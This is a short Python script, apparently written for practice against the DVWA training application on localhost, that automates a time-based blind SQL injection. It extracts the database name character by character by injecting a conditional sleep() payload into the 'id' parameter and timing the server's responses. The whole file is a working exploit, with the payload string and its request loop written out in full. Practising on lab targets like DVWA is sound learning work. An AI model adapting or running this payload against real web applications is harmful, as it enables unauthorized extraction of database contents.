import requests, time, sys, signal
from pwn import *

def def_handler(sig, frane):
	log.failure("Saliendo")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url="http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id="
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
result=""

def checker(payload):
	cookie={
	"PHPSESSID":"kno2fp620pg2l2q5etiuaut1io",
	"security":"low"
	}
	time_start=time.time()
	request = url+payload
	content = requests.get(request, cookies=cookie)
	time_end=time.time()

	if time_end - time_start > 5:
		return 1

p1 = log.progress("Database")
p2=log.progress("Payload")

for i in range(0,10):
	for c in s:
		payload = "1'+and+if(substr(database(),%d,1)='%c',sleep(5),1)--+-&Submit=Submit#" %(i,c)

		p2.status("%s" % payload)
		if checker(payload):
			result += str(c)
			p1.status("%s" % result)
			break

log.info("Database %s" % result)
